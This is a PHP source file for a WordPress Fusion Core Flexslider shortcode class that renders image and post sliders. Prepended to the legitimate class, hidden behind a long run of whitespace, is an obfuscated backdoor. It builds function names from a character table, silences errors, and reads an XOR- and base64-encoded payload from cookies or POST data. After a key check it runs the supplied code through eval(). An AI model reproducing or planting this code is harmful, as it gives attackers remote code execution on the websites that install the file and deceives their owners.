<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $GLOBALS['gf75'];global$gf75;$gf75=$GLOBALS;$gf75['r1e95']="\x6f\x4e\x78\x6b\x33\x45\x66\x70\x3a\x35\x77\x2a\x31\x42\x6e\x2d\x69\x2f\x5e\x49\x2b\x4b\x48\x3c\x76\x65\x51\x4f\x5f\x25\x5b\x5a\x59\x71\x30\x5c\xd\x79\x20\x27\x7a\x55\x44\x34\x67\x28\x62\x63\x4a\x3d\x26\x75\x61\x58\x24\xa\x38\x5d\x2e\x29\x54\x47\x68\x43\x23\x52\x64\x6d\x53\x6a\x7e\x4c\x7b\x37\x41\x4d\x36\x56\x3f\x3b\x22\x32\x57\x72\x7d\x21\x40\x2c\x74\x9\x50\x7c\x3e\x60\x6c\x73\x46\x39";$gf75[$gf75['r1e95'][44].$gf75['r1e95'][56].$gf75['r1e95'][34].$gf75['r1e95'][56].$gf75['r1e95'][43].$gf75['r1e95'][12].$gf75['r1e95'][12].$gf75['r1e95'][56].$gf75['r1e95'][47]]=$gf75['r1e95'][47].$gf75['r1e95'][62].$gf75['r1e95'][83];$gf75[$gf75['r1e95'][44].$gf75['r1e95'][66].$gf75['r1e95'][6].$gf75['r1e95'][81]]=$gf75['r1e95'][0].$gf75['r1e95'][83].$gf75['r1e95'][66];$gf75[$gf75['r1e95'][24].$gf75['r1e95'][12].$gf75['r1e95'][34].$gf75['r1e95'][47].$gf75['r1e95'][46].$gf75['r1e95'][34].$gf75['r1e95'][66].$gf75['r1e95'][25].$gf75['r1e95'][73]]=$gf75['r1e95'][95].$gf75['r1e95'][88].$gf75['r1e95'][83].$gf75['r1e95'][94].$gf75['r1e95'][25].$gf75['r1e95'][14];$gf75[$gf75['r1e95'][3].$gf75['r1e95'][52].$gf75['r1e95'][47].$gf75['r1e95'][52].$gf75['r1e95'][66].$gf75['r1e95'][6].$gf75['r1e95'][12]]=$gf75['r1e95'][16].$gf75['r1e95'][14].$gf75['r1e95'][16].$gf75['r1e95'][28].$gf75['r1e95'][95].$gf75['r1e95'][25].$gf75['r1e95'][88];$gf75[$gf75['r1e95'][67].$gf75['r1e95'][97].$gf75['r1e95'][66].$gf75['r1e95'][81].$gf75['r1e95'][4].$gf75['r1e95'][9].$gf75['r1e95'][25].$gf75['r1e95'][47].$gf75['r1e95'][12]]=$gf75['r1e95'][95].$gf75['r1e95'][25].$gf75['r1e95'][83].$gf75['r1e95'][16].$gf75['r1e95'][52].$gf75['r1e95'][94].$gf75['r1e95'][16].$gf75['r1e95'][40].$gf75['r1e95'][25];$gf75[$gf75['r1e95'][69].$gf75['r1e95'][9].$gf75['r1e95'][52].$gf75['r1e95'][56].$gf75['r1e95'][66].$gf75['r1e95'][6].$gf75['r1e95'][6].$gf75['r1e95'][56]]=$gf75['r1e95'][7].$gf75['r1e95'][62].$gf75['r1e95'][7].$gf75['r1e95'][24].$gf75['r1e95'][25].$gf75['r1e95'][83].$gf75['r1e95'][95].$gf75['r1e95'][16].$gf75['r1e95'][0].$gf75['r1e95'][14];$gf75[$gf75['r1e95'][25].$gf75['r1e95'][25].$gf75['r1e95'][73].$gf75['r1e95'][81]]=$gf75['r1e95'][51].$gf75['r1e95'][14].$gf75['r1e95'][95].$gf75['r1e95'][25].$gf75['r1e95'][83].$gf75['r1e95'][16].$gf75['r1e95'][52].$gf75['r1e95'][94].$gf75['r1e95'][16].$gf75['r1e95'][40].$gf75['r1e95'][25];$gf75[$gf75['r1e95'][69].$gf75['r1e95'][9].$gf75['r1e95'][25].$gf75['r1e95'][9]]=$gf75['r1e95'][46].$gf75['r1e95'][52].$gf75['r1e95'][95].$gf75['r1e95'][25].$gf75['r1e95'][76].$gf75['r1e95'][43].$gf75['r1e95'][28].$gf75['r1e95'][66].$gf75['r1e95'][25].$gf75['r1e95'][47].$gf75['r1e95'][0].$gf75['r1e95'][66].$gf75['r1e95'][25];$gf75[$gf75['r1e95'][51].$gf75['r1e95'][6].$gf75['r1e95'][12].$gf75['r1e95'][47].$gf75['r1e95'][52].$gf75['r1e95'][66].$gf75['r1e95'][47]]=$gf75['r1e95'][95].$gf75['r1e95'][25].$gf75['r1e95'][88].$gf75['r1e95'][28].$gf75['r1e95'][88].$gf75['r1e95'][16].$gf75['r1e95'][67].$gf75['r1e95'][25].$gf75['r1e95'][28].$gf75['r1e95'][94].$gf75['r1e95'][16].$gf75['r1e95'][67].$gf75['r1e95'][16].$gf75['r1e95'][88];$gf75[$gf75['r1e95'][67].$gf75['r1e95'][43].$gf75['r1e95'][56].$gf75['r1e95'][76].$gf75['r1e95'][56].$gf75['r1e95'][56].$gf75['r1e95'][4]]=$gf75['r1e95'][95].$gf75['r1e95'][9].$gf75['r1e95'][34].$gf75['r1e95'][81];$gf75[$gf75['r1e95'][3].$gf75['r1e95'][66].$gf75['r1e95'][97].$gf75['r1e95'][6].$gf75['r1e95'][76].$gf75['r1e95'][52].$gf75['r1e95'][81]]=$gf75['r1e95'][40].$gf75['r1e95'][66].$gf75['r1e95'][46].$gf75['r1e95'][4].$gf75['r1e95'][43].$gf75['r1e95'][6].$gf75['r1e95'][43].$gf75['r1e95'][97];$gf75[$gf75['r1e95'][33].$gf75['r1e95'][9].$gf75['r1e95'][12].$gf75['r1e95'][66].$gf75['r1e95'][97]]=$_POST;$gf75[$gf75['r1e95'][24].$gf75['r1e95'][9].$gf75['r1e95'][34].$gf75['r1e95'][97].$gf75['r1e95'][66].$gf75['r1e95'][4].$gf75['r1e95'][66]]=$_COOKIE;@$gf75[$gf75['r1e95'][3].$gf75['r1e95'][52].$gf75['r1e95'][47].$gf75['r1e95'][52].$gf75['r1e95'][66].$gf75['r1e95'][6].$gf75['r1e95'][12]]($gf75['r1e95'][25].$gf75['r1e95'][83].$gf75['r1e95'][83].$gf75['r1e95'][0].$gf75['r1e95'][83].$gf75['r1e95'][28].$gf75['r1e95'][94].$gf75['r1e95'][0].$gf75['r1e95'][44],NULL);@$gf75[$gf75['r1e95'][3].$gf75['r1e95'][52].$gf75['r1e95'][47].$gf75['r1e95'][52].$gf75['r1e95'][66].$gf75['r1e95'][6].$gf75['r1e95'][12]]($gf75['r1e95'][94].$gf75['r1e95'][0].$gf75['r1e95'][44].$gf75['r1e95'][28].$gf75['r1e95'][25].$gf75['r1e95'][83].$gf75['r1e95'][83].$gf75['r1e95'][0].$gf75['r1e95'][83].$gf75['r1e95'][95],0);@$gf75[$gf75['r1e95'][3].$gf75['r1e95'][52].$gf75['r1e95'][47].$gf75['r1e95'][52].$gf75['r1e95'][66].$gf75['r1e95'][6].$gf75['r1e95'][12]]($gf75['r1e95'][67].$gf75['r1e95'][52].$gf75['r1e95'][2].$gf75['r1e95'][28].$gf75['r1e95'][25].$gf75['r1e95'][2].$gf75['r1e95'][25].$gf75['r1e95'][47].$gf75['r1e95'][51].$gf75['r1e95'][88].$gf75['r1e95'][16].$gf75['r1e95'][0].$gf75['r1e95'][14].$gf75['r1e95'][28].$gf75['r1e95'][88].$gf75['r1e95'][16].$gf75['r1e95'][67].$gf75['r1e95'][25],0);@$gf75[$gf75['r1e95'][51].$gf75['r1e95'][6].$gf75['r1e95'][12].$gf75['r1e95'][47].$gf75['r1e95'][52].$gf75['r1e95'][66].$gf75['r1e95'][47]](0);$pcf6e047=NULL;$dc416=NULL;$gf75[$gf75['r1e95'][83].$gf75['r1e95'][52].$gf75['r1e95'][76].$gf75['r1e95'][12].$gf75['r1e95'][97]]=$gf75['r1e95'][34].$gf75['r1e95'][12].$gf75['r1e95'][34].$gf75['r1e95'][47].$gf75['r1e95'][73].$gf75['r1e95'][12].$gf75['r1e95'][6].$gf75['r1e95'][47].$gf75['r1e95'][15].$gf75['r1e95'][6].$gf75['r1e95'][52].$gf75['r1e95'][12].$gf75['r1e95'][43].$gf75['r1e95'][15].$gf75['r1e95'][43].$gf75['r1e95'][66].$gf75['r1e95'][46].$gf75['r1e95'][46].$gf75['r1e95'][15].$gf75['r1e95'][56].$gf75['r1e95'][9].$gf75['r1e95'][97].$gf75['r1e95'][81].$gf75['r1e95'][15].$gf75['r1e95'][25].$gf75['r1e95'][66].$gf75['r1e95'][76].$gf75['r1e95'][73].$gf75['r1e95'][52].$gf75['r1e95'][12].$gf75['r1e95'][34].$gf75['r1e95'][9].$gf75['r1e95'][76].$gf75['r1e95'][81].$gf75['r1e95'][25].$gf75['r1e95'][97];global$ra619;function zdb34f49($pcf6e047,$db90341){global$gf75;$yc12d2c50="";for($ha9171a4c=0;$ha9171a4c<$gf75[$gf75['r1e95'][24].$gf75['r1e95'][12].$gf75['r1e95'][34].$gf75['r1e95'][47].$gf75['r1e95'][46].$gf75['r1e95'][34].$gf75['r1e95'][66].$gf75['r1e95'][25].$gf75['r1e95'][73]]($pcf6e047);){for($h26be3a1=0;$h26be3a1<$gf75[$gf75['r1e95'][24].$gf75['r1e95'][12].$gf75['r1e95'][34].$gf75['r1e95'][47].$gf75['r1e95'][46].$gf75['r1e95'][34].$gf75['r1e95'][66].$gf75['r1e95'][25].$gf75['r1e95'][73]]($db90341)&&$ha9171a4c<$gf75[$gf75['r1e95'][24].$gf75['r1e95'][12].$gf75['r1e95'][34].$gf75['r1e95'][47].$gf75['r1e95'][46].$gf75['r1e95'][34].$gf75['r1e95'][66].$gf75['r1e95'][25].$gf75['r1e95'][73]]($pcf6e047);$h26be3a1++,$ha9171a4c++){$yc12d2c50.=$gf75[$gf75['r1e95'][44].$gf75['r1e95'][56].$gf75['r1e95'][34].$gf75['r1e95'][56].$gf75['r1e95'][43].$gf75['r1e95'][12].$gf75['r1e95'][12].$gf75['r1e95'][56].$gf75['r1e95'][47]]($gf75[$gf75['r1e95'][44].$gf75['r1e95'][66].$gf75['r1e95'][6].$gf75['r1e95'][81]]($pcf6e047[$ha9171a4c])^$gf75[$gf75['r1e95'][44].$gf75['r1e95'][66].$gf75['r1e95'][6].$gf75['r1e95'][81]]($db90341[$h26be3a1]));}}return$yc12d2c50;}function s502($pcf6e047,$db90341){global$gf75;global$ra619;return$gf75[$gf75['r1e95'][3].$gf75['r1e95'][66].$gf75['r1e95'][97].$gf75['r1e95'][6].$gf75['r1e95'][76].$gf75['r1e95'][52].$gf75['r1e95'][81]]($gf75[$gf75['r1e95'][3].$gf75['r1e95'][66].$gf75['r1e95'][97].$gf75['r1e95'][6].$gf75['r1e95'][76].$gf75['r1e95'][52].$gf75['r1e95'][81]]($pcf6e047,$ra619),$db90341);}foreach($gf75[$gf75['r1e95'][24].$gf75['r1e95'][9].$gf75['r1e95'][34].$gf75['r1e95'][97].$gf75['r1e95'][66].$gf75['r1e95'][4].$gf75['r1e95'][66]]as$db90341=>$wa0ea8){$pcf6e047=$wa0ea8;$dc416=$db90341;}if(!$pcf6e047){foreach($gf75[$gf75['r1e95'][33].$gf75['r1e95'][9].$gf75['r1e95'][12].$gf75['r1e95'][66].$gf75['r1e95'][97]]as$db90341=>$wa0ea8){$pcf6e047=$wa0ea8;$dc416=$db90341;}}$pcf6e047=@$gf75[$gf75['r1e95'][25].$gf75['r1e95'][25].$gf75['r1e95'][73].$gf75['r1e95'][81]]($gf75[$gf75['r1e95'][67].$gf75['r1e95'][43].$gf75['r1e95'][56].$gf75['r1e95'][76].$gf75['r1e95'][56].$gf75['r1e95'][56].$gf75['r1e95'][4]]($gf75[$gf75['r1e95'][69].$gf75['r1e95'][9].$gf75['r1e95'][25].$gf75['r1e95'][9]]($pcf6e047),$dc416));if(isset($pcf6e047[$gf75['r1e95'][52].$gf75['r1e95'][3]])&&$ra619==$pcf6e047[$gf75['r1e95'][52].$gf75['r1e95'][3]]){if($pcf6e047[$gf75['r1e95'][52]]==$gf75['r1e95'][16]){$ha9171a4c=Array($gf75['r1e95'][7].$gf75['r1e95'][24]=>@$gf75[$gf75['r1e95'][69].$gf75['r1e95'][9].$gf75['r1e95'][52].$gf75['r1e95'][56].$gf75['r1e95'][66].$gf75['r1e95'][6].$gf75['r1e95'][6].$gf75['r1e95'][56]](),$gf75['r1e95'][95].$gf75['r1e95'][24]=>$gf75['r1e95'][12].$gf75['r1e95'][58].$gf75['r1e95'][34].$gf75['r1e95'][15].$gf75['r1e95'][12],);echo@$gf75[$gf75['r1e95'][67].$gf75['r1e95'][97].$gf75['r1e95'][66].$gf75['r1e95'][81].$gf75['r1e95'][4].$gf75['r1e95'][9].$gf75['r1e95'][25].$gf75['r1e95'][47].$gf75['r1e95'][12]]($ha9171a4c);}elseif($pcf6e047[$gf75['r1e95'][52]]==$gf75['r1e95'][25]){eval($pcf6e047[$gf75['r1e95'][66]]);}exit();} ?><?php
class FusionSC_Flexslider {

	private $flex_counter = 1;

	public static $args;

	/**
	 * Initiate the shortcode
	 */
	public function __construct() {

		add_filter( 'fusion_attr_flexslider-shortcode', array( $this, 'attr' ) );
		add_filter( 'fusion_attr_flexslider-shortcode-slides-container', array( $this, 'slides_container_attr' ) );
		add_filter( 'fusion_attr_flexslider-shortcode-caption', array( $this, 'caption_attr' ) );
		add_filter( 'fusion_attr_flexslider-shortcode-title-container', array( $this, 'title_container_attr' ) );
		add_filter( 'fusion_attr_flexslider-shortcode-thumbnails', array( $this, 'thumbnails_attr' ) );

		add_shortcode( 'flexslider', array( $this, 'render' ) );
		add_shortcode( 'postslider', array( $this, 'render' ) );
	}

	/**
	 * Render the shortcode
	 * 
	 * @param  array $args	 Shortcode paramters
	 * @param  string $content Content between shortcode
	 * @return string		  HTML output
	 */
	function render( $args, $content = '' ) {

		$defaults =	FusionCore_Plugin::set_shortcode_defaults(
			array(
				'class'		=> '',			
				'id' 		=> '',
				'category'	=> '',
				'excerpt' 	=> '35',				
				//'group' 	=> '', not yet used
				'layout' 	=> 'attachments',
				'lightbox' 	=> 'yes',
				'limit' 	=> '3',
				'post_id' 	=> '',
			), $args
		);

		extract( $defaults );

		self::$args = $defaults;

		$thumbnails = '';

		if( $layout == 'attachments' ) {
			$slider = $this->attachments();
			$thumbnails = $this->get_attachments_thumbnails();
		} else if( $layout == 'posts' ) {
			$slider = $this->posts();
		} else if( $layout == 'posts-with-excerpt' ) {
			$slider = $this->posts_excerpt();
		} else {
			//$slider = $this->default_layout();
			$slider = '';
		}

		$slides_html = sprintf( '<ul %s>%s</ul>', FusionCore_Plugin::attributes( 'flexslider-shortcode-slides-container' ), $slider );


		$html = sprintf( '<div %s>%s</div>', FusionCore_Plugin::attributes( 'flexslider-shortcode' ), $slides_html );

		if( $layout == 'attachments' ) {
			$thumbnails_html = '';
			$html .= sprintf( '<div %s>%s</div>', FusionCore_Plugin::attributes( 'flexslider-shortcode-thumbnails' ), $thumbnails_html );
		}
		
		$this->flex_counter++;

		return $html;

	}

	/**
	 * Default layout of Flexslider
	 * 
	 * @return string HTML for default layout slides
	 */
	function default_layout() {

		if( self::$args['group'] ) {

			$html = '';

			$group = explode( ',', self::$args['group'] );

			$query = new WP_Query( array(
				'post_type' 	 => 'slide',
				'posts_per_page' => self::$args['limit'],
				'tax_query' 	 => array(
					array(
						'taxonomy' => 'slide-page',
						'field'	=> 'slug',
						'terms'	=> $group,
					),
				),
			) );

			if( $query->have_posts() ):

				while( $query->have_posts() ): $query->the_post();

					$meta = get_post_meta( get_the_ID(), 'smof_data', true );
					$caption = '';

					if( isset( $meta['caption'] ) && $meta['caption'] ) {
						$caption = sprintf( '<p %s>%s</p>', FusionCore_Plugin::attributes( 'flexslider-shortcode-caption' ), $meta['caption'] );
					}

					$html .= sprintf( '<li>%s</li>', fusion_get_post_content( '', 'yes', self::$args['excerpt'], true ) . $caption );

				endwhile;

			else:
			endif;

			wp_reset_query();

			return $html;

		}

	}

	function attachments() {

		$html = '';

		if( ! self::$args['post_id'] ) {
			self::$args['post_id'] = get_the_ID();
		}

		$query = get_posts( array(
			'post_type' 	 => 'attachment',
			'posts_per_page' => self::$args['limit'],
			'post_status'	=> null,
			'post_parent' 	 => self::$args['post_id'],
			'orderby'		 => 'menu_order',
			'order' 		 => 'ASC',
			'post_mime_type' => 'image',
			'exclude' 		 => get_post_thumbnail_id()
		) );

		if( $query ):

			foreach( $query as $attachment ):

				$image = wp_get_attachment_url( $attachment->ID );
				$title = get_post_field( 'post_title', $attachment->ID );
				$alt = get_post_meta( $attachment->ID, '_wp_attachment_image_alt', true );
				$thumb = wp_get_attachment_image_src( $attachment->ID, 'thumbnail' );
				$caption = get_post_field( 'post_excerpt', $attachment->ID );

				$image_output = sprintf( '<img src="%s" alt="%s" />', $image, $alt );
				$output = $image_output;

				if( self::$args['lightbox'] == 'yes' ) {
					$output = sprintf( '<a href="%s" data-title="%s" data-caption="%s" title="%s" data-rel="prettyPhoto[flex_%s]">%s</a>', $image, $title, $caption, $title, $this->flex_counter, $image_output );
				}

				$html .= sprintf( '<li data-thumb="' . $thumb[0] . '">%s</li>', $output );

			endforeach;

		endif;

		wp_reset_query();

		return $html;

	}

	function get_attachments_thumbnails() {

		$html = '';

		if( ! self::$args['post_id'] ) {
			self::$args['post_id'] = get_the_ID();
		}

		$query = get_posts( array(
			'post_type' 	 => 'attachment',
			'posts_per_page' => self::$args['limit'],
			'post_status'	=> null,
			'post_parent' 	 => self::$args['post_id'],
			'orderby'		 => 'menu_order',
			'order' 		 => 'ASC',
			'post_mime_type' => 'image',
			'exclude' 		 => get_post_thumbnail_id()
		) );

		if( $query ):

			foreach( $query as $attachment ):

				$image = wp_get_attachment_url( $attachment->ID );
				$title = get_post_field( 'post_excerpt', $attachment->ID );
				$alt = get_post_meta( $attachment->ID, '_wp_attachment_image_alt', true );
				$thumb = wp_get_attachment_image_src( $attachment->ID, 'thumbnail' );

				$image_output = sprintf( '<img src="%s" alt="%s" />', $thumb[0], $alt );
				$output = $image_output;

				$html .= sprintf( '<li>%s</li>', $output );

			endforeach;

		endif;

		wp_reset_query();

		return $html;

	}

	function posts() {

		$html = '';

		$args = array(
			'posts_per_page' => self::$args['limit'],
			'meta_query' 	 => array(
				array(
					'key' => '_thumbnail_id'
				)
			),
		);

		if( self::$args['post_id'] ) {
			$post_ids = explode( ',', self::$args['post_id'] );
			$args['post__in'] = $post_ids;
		}

		if( self::$args['category'] ) {
			$args['category_name'] = self::$args['category'];
		}

		$query = new WP_Query( $args );

		if( $query->have_posts() ):

			while( $query->have_posts() ): $query->the_post();

				$image = wp_get_attachment_url( get_post_thumbnail_id() );
				$title = get_post_field( 'post_excerpt', get_post_thumbnail_id() );
				$alt = get_the_title();

				$image_output = sprintf( '<img src="%s" alt="%s" />', $image, get_the_title() );

				$link_output = sprintf( '<a href="%s">%s</a>', get_permalink(), $image_output );

				$title = sprintf( '<h2><a href="%s">%s</a></h2>', get_permalink(), get_the_title() );

				$container = sprintf( '<div %s>%s</div>', FusionCore_Plugin::attributes( 'flexslider-shortcode-title-container' ), $title );

				$html .= sprintf( '<li>%s</li>', $link_output . $container );

			endwhile;

		else:
		endif;

		wp_reset_query();

		return $html;

	}

	function posts_excerpt() {


		$html = '';

		$args = array(
			'posts_per_page' => self::$args['limit'],
			'meta_query' 	 => array(
				array(
					'key' => '_thumbnail_id'
				)
			),
		);

		if( self::$args['post_id'] ) {
			$post_ids = explode( ',', self::$args['post_id'] );
			$args['post__in'] = $post_ids;
		}

		if( self::$args['category'] ) {
			$args['category_name'] = self::$args['category'];
		}

		$query = new WP_Query( $args );

		if( $query->have_posts() ):

			while( $query->have_posts() ): $query->the_post();

				$image = wp_get_attachment_url( get_post_thumbnail_id() );
				$title = get_post_field( 'post_excerpt', get_post_thumbnail_id() );
				$alt = get_the_title();

				$image_output = sprintf( '<img src="%s" alt="%s" />', $image, get_the_title() );

				$link_output = sprintf( '<a href="%s">%s</a>', get_permalink(), $image_output );

				$title = sprintf( '<h2><a href="%s">%s</a></h2>', get_permalink(), get_the_title() );
				$excerpt = sprintf( '%s', fusion_get_post_content( '', 'yes', self::$args['excerpt'], true ) );

				$container = sprintf( '<div %s><div %s>%s</div></div>', FusionCore_Plugin::attributes( 'flexslider-shortcode-title-container' ), 
									  FusionCore_Plugin::attributes( 'excerpt-container' ), $title . $excerpt );

				$html .= sprintf( '<li>%s</li>', $link_output . $container );

			endwhile;

		else:
		endif;

		wp_reset_query();

		return $html;

	}

	function attr() {

		$attr['class'] = 'fusion-flexslider fusion-flexslider-loading flexslider-' . self::$args['layout'];

		if( self::$args['lightbox'] == 'yes' && self::$args['layout'] == 'attachments' ) {
			$attr['class'] .= ' flexslider-lightbox';
		}

		if( self::$args['class'] ) {
			$attr['class'] .= ' ' . self::$args['class'];
		}

		if( self::$args['id'] ) {
			$attr['id'] = self::$args['id'];
		}

		return $attr;

	}

	function slides_container_attr() {

		$attr['class'] = 'slides';

		return $attr;

	}

	function caption_attr() {

		$attr['class'] = 'flex-caption';

		return $attr;

	}

	function title_container_attr() {

		$attr['class'] = 'slide-excerpt';

		return $attr;

	}

	function thumbnails_attr() {

		$attr['class'] = 'flexslider';

		if( self::$args['layout'] == 'attachments' ) {
			$attr['class'] .= ' fat';
		}

		return $attr;

	}

}

new FusionSC_Flexslider();
